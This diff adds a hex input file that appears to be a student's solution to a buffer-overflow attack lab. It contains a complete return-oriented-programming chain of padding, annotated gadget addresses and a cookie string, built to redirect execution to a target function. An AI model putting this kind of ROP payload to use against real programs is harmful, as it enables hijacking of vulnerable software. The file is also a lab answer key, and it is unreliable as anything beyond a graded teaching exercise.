@@ -1,0 +1,19 @@
+00 00 00 00 00 00 00 00 /* 56 byte buffer */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+d9 18 40 00 00 00 00 00 /* movq rsp, rax: 48 89 e0 at address 0x4018d9 */
+a5 18 40 00 00 00 00 00 /* movq rax, rdi: 48 89 c7 at address 0x4018a5 */
+98 18 40 00 00 00 00 00 /* popq rax: 58 at address 0x401898 */
+48 00 00 00 00 00 00 00 /* offset of cookie string from starting rsp: 72 = 0x48 */
+14 19 40 00 00 00 00 00 /* movl eax, ecx: 89 c1 at address 0x401914 */
+28 19 40 00 00 00 00 00 /* movl ecx, edx: 89 ca at address 0x401928 */
+2f 19 40 00 00 00 00 00 /* movl edx, esi: 89 d6 at address 0x40192f */
+cc 18 40 00 00 00 00 00 /* lea (%rdi,%rsi,1),%rax: 48 8d 04 37 at address 0x4018cc */
+a5 18 40 00 00 00 00 00 /* movq rax, rdi: 48 89 c7 at address 0x4018a5 */
+00 18 40 00 00 00 00 00 /* address of touch3: 0x401800 */
+37 33 30 62 33 30 65 62 /* string representation of cookie */
+00 00 00 00 00 00 00 00 /* string ends with 00 */
